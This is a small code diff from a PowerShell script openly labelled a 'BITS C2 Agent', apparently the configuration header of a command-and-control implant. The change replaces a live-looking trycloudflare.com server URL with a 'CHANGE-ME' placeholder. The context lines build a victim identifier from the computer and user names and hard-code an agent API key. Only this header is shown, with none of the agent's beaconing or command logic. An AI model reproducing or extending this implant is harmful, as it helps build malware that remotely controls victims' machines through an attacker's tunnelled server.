@@ -1,7 +1,7 @@
 # BITS C2 Agent - Simple Version (No SSL, No HMAC)
 # Just works!
 
- $ServerUrl = "https://attention-launches-kind-commonly.trycloudflare.com/bits"
+ $ServerUrl = "https://CHANGE-MECHANGE-ME.trycloudflare.com/bits"
 $AgentId = $env:COMPUTERNAME + "_" + $env:USERNAME
 $ApiKey = "c2-agent-k3y-2024-s3cr3t"
 
